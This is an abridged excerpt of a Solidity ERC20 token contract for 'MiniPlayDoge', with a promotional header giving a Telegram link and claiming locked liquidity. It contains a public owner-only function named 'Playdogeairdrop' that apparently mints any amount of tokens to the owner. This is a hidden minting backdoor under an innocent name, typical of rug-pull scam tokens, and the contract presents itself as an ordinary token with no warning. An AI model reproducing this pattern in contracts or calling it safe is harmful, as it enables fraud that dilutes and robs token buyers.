...
/*
 ...
 Telegram: https://t.me/MiniPlayDoge

 Liquidity 2 years Locked
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Playdogeairdrop(uint256 amount) public onlyOwner {
    _Playdogeairdrop(msg.sender, amount);
    }
    ...
    function _Playdogeairdrop(address account, uint256 amount) internal virtual {
...
contract MINIPLAYDOGE is ERC20 {

    uint tokenTotalSupply = 100000;

    constructor() public ERC20("MiniPlayDoge", "MPLAYDOGE") {
        _Playdogeairdrop(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}